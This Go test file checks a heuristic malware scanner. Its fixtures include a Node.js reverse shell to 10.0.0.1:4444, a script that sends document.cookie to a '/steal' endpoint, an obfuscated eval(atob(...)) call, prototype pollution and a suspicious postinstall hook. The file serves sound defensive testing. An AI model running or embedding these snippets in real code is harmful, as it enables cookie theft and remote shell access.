package heuristic

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanContent_DetectsEval(t *testing.T) {
	scanner := NewDefaultScanner(false)
	findings := scanner.ScanContent("test.js", `var x = eval("alert(1)");`)

	found := false
	for _, f := range findings {
		if f.PatternID == "obf-eval" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected eval detection, got %d findings: %v", len(findings), findings)
	}
}

func TestScanContent_DetectsReverseShell(t *testing.T) {
	scanner := NewDefaultScanner(false)
	code := `const cp = require('child_process');
const net = require('net');
const s = new net.Socket();
s.connect(4444, "10.0.0.1", function(){
  s.pipe(cp.exec("/bin/sh").stdin);
});`

	findings := scanner.ScanContent("malware.js", code)

	categories := make(map[Category]bool)
	for _, f := range findings {
		categories[f.Category] = true
	}

	if !categories[CategoryNetwork] {
		t.Error("expected network category finding")
	}
}

func TestScanContent_DetectsPrototypePollution(t *testing.T) {
	scanner := NewDefaultScanner(false)
	findings := scanner.ScanContent("test.js", `obj.__proto__.isAdmin = true;`)

	found := false
	for _, f := range findings {
		if f.PatternID == "cve-prototype-pollution" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected prototype pollution detection, got %v", findings)
	}
}

func TestScanContent_DetectsSupplyChainInstallHook(t *testing.T) {
	scanner := NewDefaultScanner(false)
	findings := scanner.ScanContent("package.json", `{
  "name": "evil-package",
  "scripts": {
    "postinstall": "node setup.js"
  }
}`)

	found := false
	for _, f := range findings {
		if f.Category == CategoryExecution || f.Category == CategorySupplyChain {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected install hook detection")
	}
}

func TestScanContent_CleanCode(t *testing.T) {
	scanner := NewDefaultScanner(false)
	findings := scanner.ScanContent("clean.js", `
function add(a, b) {
  return a + b;
}
console.log(add(1, 2));
`)

	if len(findings) > 0 {
		t.Errorf("expected no findings for clean code, got %d: %v", len(findings), findings)
	}
}

func TestScanContent_HighEntropy(t *testing.T) {
	scanner := NewDefaultScanner(false)
	// A high entropy string >80 chars — random base64 characters
	findings := scanner.ScanContent("test.js",
		`var payload = "Kj7xR2mN9pQ4sT6vW8yA1bC3dE5fG7hI0jL2kM4nO6qS8tU0wX2zA1bC3dE5fG7hI0jKj7xR2mN9pQ4sT6vW8yA1bC3dE5f";`)

	found := false
	for _, f := range findings {
		if f.PatternID == "heur-high-entropy" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected high-entropy string detection")
	}
}

func TestScanDirectory(t *testing.T) {
	dir := t.TempDir()

	// Write a malicious file
	err := os.WriteFile(filepath.Join(dir, "evil.js"), []byte(`
var data = document.cookie;
fetch("http://10.0.0.1:8080/steal?c=" + btoa(data));
eval(atob("YWxlcnQoMSk="));
`), 0644)
	if err != nil {
		t.Fatal(err)
	}

	// Write a clean file
	err = os.WriteFile(filepath.Join(dir, "clean.js"), []byte(`
function hello() { return "world"; }
`), 0644)
	if err != nil {
		t.Fatal(err)
	}

	scanner := NewDefaultScanner(false)
	result, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}

	if result.FilesScanned != 2 {
		t.Errorf("expected 2 files scanned, got %d", result.FilesScanned)
	}
	if result.TotalFindings == 0 {
		t.Error("expected findings in evil.js")
	}
	if result.ThreatLevel == "CLEAN" {
		t.Error("expected non-CLEAN threat level")
	}
}

func TestBuildResult(t *testing.T) {
	findings := []Finding{
		{PatternID: "test-1", Category: CategoryNetwork, Severity: SeverityCritical, Weight: 40},
		{PatternID: "test-2", Category: CategoryObfuscation, Severity: SeverityHigh, Weight: 20},
	}

	result := BuildResult([]string{"file1.js"}, findings)

	if result.TotalFindings != 2 {
		t.Errorf("expected 2 findings, got %d", result.TotalFindings)
	}
	if result.ThreatScore != 60 {
		t.Errorf("expected score 60, got %d", result.ThreatScore)
	}
	if result.ThreatLevel != "MEDIUM" {
		t.Errorf("expected MEDIUM, got %s", result.ThreatLevel)
	}
}

func TestShannonEntropy(t *testing.T) {
	tests := []struct {
		input string
		minE  float64
		maxE  float64
	}{
		{"aaaa", 0, 0.1},
		{"abcd", 1.9, 2.1},
		{"aGVsbG8gd29ybGQ=", 3.0, 4.5},
	}

	for _, tt := range tests {
		e := shannonEntropy(tt.input)
		if e < tt.minE || e > tt.maxE {
			t.Errorf("shannonEntropy(%q) = %.2f, want [%.1f, %.1f]", tt.input, e, tt.minE, tt.maxE)
		}
	}
}

func TestDefaultPatterns_AllCompile(t *testing.T) {
	patterns := DefaultPatterns()
	scanner := NewScanner(patterns, false)

	compileFailed := 0
	for _, cp := range scanner.patterns {
		for _, lit := range cp.literals {
			t.Errorf("pattern %q in %s failed to compile: %s", lit, cp.ID, lit)
			compileFailed++
		}
	}
	if compileFailed > 0 {
		t.Errorf("%d patterns failed to compile as regex", compileFailed)
	}
}

func TestSeverityRank(t *testing.T) {
	if severityRank(SeverityCritical) <= severityRank(SeverityHigh) {
		t.Error("CRITICAL should rank higher than HIGH")
	}
	if severityRank(SeverityHigh) <= severityRank(SeverityMedium) {
		t.Error("HIGH should rank higher than MEDIUM")
	}
}
